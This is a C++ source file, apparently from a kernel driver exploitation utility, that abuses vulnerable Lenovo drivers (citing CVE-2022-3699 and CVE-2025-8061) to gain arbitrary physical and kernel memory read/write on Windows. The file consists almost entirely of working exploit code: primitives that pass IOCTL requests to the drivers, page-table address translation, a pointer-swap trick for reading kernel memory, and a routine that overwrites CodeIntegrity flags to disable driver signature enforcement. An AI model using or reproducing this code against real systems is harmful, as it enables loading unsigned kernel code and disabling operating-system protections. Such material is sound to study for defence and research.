/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2023 - 2026
*
*  TITLE:       LENOVO.CPP
*
*  VERSION:     1.47
*
*  DATE:        25 Mar 2026
*
*  Lenovo driver routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"
#include "idrv/lenovo.h"

//
// Based on CVE-2022-3699.
//

static PHYSICAL_ADDRESS g_LddSwapAddress;
static ULONG_PTR g_MiPteBase;

BOOL LddReadVirtualAddressPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* Value);

#define LDD_CHECK_DATA_SIZE(Size) \
    switch (Size) { \
    case 1: \
    case 2: \
    case 4: \
    case 8: \
        break; \
    default: \
        SetLastError(ERROR_INVALID_PARAMETER); \
        return FALSE;\
    }\

/*
* LddpVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to the physical.
*
*/
BOOL WINAPI LddpVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    MMPTE PageTableEntry;
    PAGE_TYPE PageType;
    MI_PTE_HIERARCHY PteHierarchy = { 0, 0, 0, 0 };

    supCreatePteHierarchy(VirtualAddress, &PteHierarchy, g_MiPteBase);

    PageTableEntry.Value = 0;

    LddReadVirtualAddressPrimitive(DeviceHandle,
        PteHierarchy.PTE,
        &PageTableEntry.Value);

    if (PageTableEntry.Value == 0) {

        LddReadVirtualAddressPrimitive(DeviceHandle,
            PteHierarchy.PDE,
            &PageTableEntry.Value);

        PageType = PageTypePde;
    }
    else {
        PageType = PageTypePte;
    }

    switch (PageType) {
    case PageTypePte:
        VirtualAddress &= 0xfff;
        break;
    case PageTypePde:
        VirtualAddress &= 0x1fffff;
        break;
    default:
        *PhysicalAddress = 0;
        return FALSE;
    }

    *PhysicalAddress = (PageTableEntry.HardwarePte.PageFrameNumber << 12) + VirtualAddress;

    return TRUE;
}

/*
* LddReadPhysicalMemoryPrimitive
*
* Purpose:
*
* Basic physical memory read primitive.
*
*/
BOOL LddReadPhysicalMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ ULONG Size,
    _Out_ ULONG_PTR* Value)
{
    BOOL bResult = FALSE;
    ULONG_PTR value = 0;
    LDD_READ_REQUEST request;

    *Value = 0;

    LDD_CHECK_DATA_SIZE(Size);

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address.QuadPart = Address;
    request.Size = Size;

    bResult = supCallDriver(DeviceHandle,
        IOCTL_LDD_READ_PHYSICAL_MEMORY,
        &request,
        sizeof(LDD_READ_REQUEST),
        &value,
        sizeof(value));

    *Value = value;

    return bResult;
}

/*
* LddWritePhysicalMemoryPrimitive
*
* Purpose:
*
* Basic physical memory write primitive.
*
*/
BOOL LddWritePhysicalMemoryPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ DWORD Size,
    _In_ ULONG_PTR Value)
{
    LDD_WRITE_REQUEST request;

    LDD_CHECK_DATA_SIZE(Size);

    RtlSecureZeroMemory(&request, sizeof(request));

    request.Address.QuadPart = Address;
    request.Size = Size;
    request.Data = Value;

    return supCallDriver(DeviceHandle,
        IOCTL_LDD_WRITE_PHYSICAL_MEMORY,
        &request,
        sizeof(LDD_WRITE_REQUEST),
        NULL,
        0);
}

/*
* LddReadVirtualAddressPrimitive
*
* Purpose:
*
* Read value from the virtual address.
*
*/
BOOL LddReadVirtualAddressPrimitive(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* Value
)
{
    *Value = 0;

    //
    // Write virtual address to the our address swap area.
    // Lenovo driver expects value to be a pointer so it will dereference 
    // value and write result to the given physical address.
    // 
    // Thus we will be able to read km address value from physical memory back.
    //
    if (!LddWritePhysicalMemoryPrimitive(DeviceHandle,
        g_LddSwapAddress.QuadPart,
        sizeof(ULONG_PTR),
        VirtualAddress))
    {
        return FALSE;
    }

    //
    // Read result.
    //
    return LddReadPhysicalMemoryPrimitive(DeviceHandle,
        g_LddSwapAddress.QuadPart,
        sizeof(ULONG_PTR),
        Value);

}

/*
* LddReadWritePhysicalMemoryStub
*
* Purpose:
*
* Stub.
*
*/
BOOL WINAPI LddReadWritePhysicalMemoryStub(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    UNREFERENCED_PARAMETER(DeviceHandle);
    UNREFERENCED_PARAMETER(PhysicalAddress);
    UNREFERENCED_PARAMETER(Buffer);
    UNREFERENCED_PARAMETER(NumberOfBytes);

    SetLastError(ERROR_CALL_NOT_IMPLEMENTED);
    return FALSE;
}

/*
* LddReadKernelVirtualMemory
*
* Purpose:
*
* Read virtual memory.
*
*/
_Success_(return != FALSE)
BOOL WINAPI LddReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR physAddress = 0;

    PBYTE BufferPtr = (PBYTE)Buffer;

    if (!LddpVirtualToPhysical(DeviceHandle, Address, &physAddress))
        return FALSE;

    ULONG_PTR address = physAddress, tmpValue;
    ULONG readBytes = 0;
    BYTE valueRead;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        valueRead = 0;
        tmpValue = 0;
        if (!LddReadPhysicalMemoryPrimitive(DeviceHandle,
            address,
            sizeof(valueRead),
            &tmpValue))
        {
            break;
        }

        valueRead = (BYTE)tmpValue;

        BufferPtr[i] = valueRead;
        address += sizeof(valueRead);
        readBytes += sizeof(valueRead);
    }

    return (readBytes == NumberOfBytes);
}

/*
* LddWriteKernelVirtualMemory
*
* Purpose:
*
* Write virtual memory.
*
*/
BOOL WINAPI LddWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    ULONG_PTR physAddress = 0;

    PBYTE BufferPtr = (PBYTE)Buffer;

    if (!LddpVirtualToPhysical(DeviceHandle, Address, &physAddress))
        return FALSE;

    ULONG_PTR address = physAddress;
    ULONG writeBytes = 0;
    BYTE valueWrite;

    for (ULONG i = 0; i < NumberOfBytes; i++) {

        valueWrite = BufferPtr[i];
        if (!LddWritePhysicalMemoryPrimitive(DeviceHandle,
            address,
            sizeof(valueWrite),
            (ULONG_PTR)&valueWrite))
        {
            break;
        }

        address += sizeof(valueWrite);
        writeBytes += sizeof(valueWrite);
    }

    return (writeBytes == NumberOfBytes);
}

/*
* LddpFindSwapAddress
*
* Purpose:
*
* Locate first zero 8 bytes in first megabyte of RAM to use it for pointers dereference later.
*
*/
ULONG_PTR LddpFindSwapAddress(
    _In_ HANDLE DeviceHandle
)
{
    ULONG_PTR currentAddress = 0x1000;
    ULONG_PTR endAddress = 0x10000;
    ULONG_PTR probedValue;

    while (currentAddress < endAddress) {

        if (LddReadPhysicalMemoryPrimitive(DeviceHandle,
            currentAddress,
            sizeof(ULONG_PTR),
            &probedValue))
        {
            if (probedValue == 0)
                return currentAddress;
        }
        else {
            break;
        }

        currentAddress += sizeof(ULONG_PTR);
    }

    return 0;
}

/*
* LddControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags using physical memory write.
*
*/
BOOL LddControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    HANDLE deviceHandle = Context->DeviceHandle;
    ULONG_PTR physAddress = 0;
    ULONG_PTR dseValue = DSEValue;

    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
        (PVOID)Address,
        DSEValue);

    if (!LddpVirtualToPhysical(deviceHandle, Address, &physAddress))
        return FALSE;

    if (LddWritePhysicalMemoryPrimitive(deviceHandle,
        physAddress,
        sizeof(dseValue),
        (ULONG_PTR)&dseValue))
    {
        printf_s("[+] Kernel memory write complete, verifying data\r\n");

        if (LddReadPhysicalMemoryPrimitive(deviceHandle,
            physAddress,
            sizeof(dseValue),
            &dseValue))
        {
            bResult = (DSEValue == dseValue);
            supPrintfEvent(
                (bResult == FALSE) ? kduEventError : kduEventInformation,
                "%s Write result verification %s\r\n",
                (bResult == FALSE) ? "[!]" : "[+]",
                (bResult == FALSE) ? "failed" : "succeeded");
        }
        else {
            supPrintfEvent(kduEventError,
                "[!] Could not verify kernel memory write\r\n");

        }
    }
    else {
        supPrintfEvent(kduEventError,
            "[!] Error while writing to the kernel memory\r\n");
    }

    return bResult;
}

/*
* LddRegisterDriver
*
* Purpose:
*
* Find address for swap, MiPteBase and it value.
*
*/
BOOL WINAPI LddRegisterDriver(
    _In_ HANDLE DeviceHandle,
    _In_opt_ PVOID Param)
{
    UNREFERENCED_PARAMETER(Param);

    ULONG_PTR address;

    g_LddSwapAddress.QuadPart = LddpFindSwapAddress(DeviceHandle);
    if (g_LddSwapAddress.QuadPart) {
        printf_s("[+] Physical address used for address swaps: 0x%llX.\r\n", g_LddSwapAddress.QuadPart);
    }

    g_MiPteBase = 0;
    address = supResolveMiPteBaseAddress(NULL);
    if (address) {
        if (LddReadVirtualAddressPrimitive(DeviceHandle, address, &g_MiPteBase)) {
            printf_s("[+] Found MiPteBase at 0x%llX, value: 0x%llX\r\n",
                address,
                g_MiPteBase);
        }
    }

    return (g_MiPteBase != NULL && g_LddSwapAddress.QuadPart != 0);
}

//
// Based on CVE-2025-8061.
//

/*
* LnvMsrReadPhysicalMemory
*
* Purpose:
*
* Read physical memory via Lenovo MSR I/O driver.
*
*/
BOOL WINAPI LnvMsrReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    ULONG bytesReturned;
    DWORD lastError;
    LNVMSRIO_PHYS_READ_REQUEST request;

    if (DeviceHandle == NULL || Buffer == NULL || NumberOfBytes == 0)
        return FALSE;

    RtlSecureZeroMemory(&request, sizeof(request));

    request.PhysicalAddress = (ULONG64)PhysicalAddress;
    request.AccessSize = 1;
    request.Count = NumberOfBytes;

    bytesReturned = 0;
    SetLastError(ERROR_SUCCESS);

    bResult = supCallDriver(DeviceHandle,
        IOCTL_LNVMSRIO_READ_PHYSICAL_MEMORY,
        &request,
        sizeof(request),
        Buffer,
        NumberOfBytes);

    if (!bResult) {
        lastError = GetLastError();
        supPrintfEvent(kduEventError,
            "[!] LnvMsrReadPhysicalMemory failed, win32 error %lu\r\n",
            lastError);
    }

    return bResult;
}

/*
* LnvMsrWritePhysicalMemory
*
* Purpose:
*
* Write physical memory via Lenovo MSR I/O driver.
*
*/
BOOL WINAPI LnvMsrWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    BOOL bResult = FALSE;
    SIZE_T size;
    DWORD lastError;
    PLNVMSRIO_PHYS_WRITE_REQUEST request;

    if (DeviceHandle == NULL || Buffer == NULL || NumberOfBytes == 0)
        return FALSE;

    size = FIELD_OFFSET(LNVMSRIO_PHYS_WRITE_REQUEST, Data) + NumberOfBytes;
    request = (PLNVMSRIO_PHYS_WRITE_REQUEST)supHeapAlloc(size);
    if (request == NULL)
        return FALSE;

    request->PhysicalAddress = (ULONG64)PhysicalAddress;
    request->AccessSize = 1;
    request->Count = NumberOfBytes;

    RtlCopyMemory(request->Data, Buffer, NumberOfBytes);

    SetLastError(ERROR_SUCCESS);

    bResult = supCallDriver(DeviceHandle,
        IOCTL_LNVMSRIO_WRITE_PHYSICAL_MEMORY,
        request,
        (ULONG)size,
        NULL,
        0);

    if (!bResult) {
        lastError = GetLastError();
        supPrintfEvent(kduEventError,
            "[!] LnvMsrWritePhysicalMemory failed, win32 error %lu\r\n",
            lastError);
    }

    supHeapFree(request);

    return bResult;
}

/*
* LnvMsrVirtualToPhysical
*
* Purpose:
*
* Translate virtual address to physical via Superfetch map.
*
*/
BOOL WINAPI LnvMsrVirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR * PhysicalAddress)
{
    UNREFERENCED_PARAMETER(DeviceHandle);

    return supVirtualToPhysicalWithSuperfetch(VirtualAddress, PhysicalAddress);
}

/*
* LnvMsrReadKernelVirtualMemory
*
* Purpose:
*
* Read kernel virtual memory via Superfetch translation + physical memory read.
*
*/
BOOL WINAPI LnvMsrReadKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supReadKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        LnvMsrReadPhysicalMemory);
}

/*
* LnvMsrWriteKernelVirtualMemory
*
* Purpose:
*
* Write kernel virtual memory via Superfetch translation + physical memory write.
*
*/
BOOL WINAPI LnvMsrWriteKernelVirtualMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    return supWriteKernelVirtualMemoryWithSuperfetch(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes,
        LnvMsrWritePhysicalMemory);
}
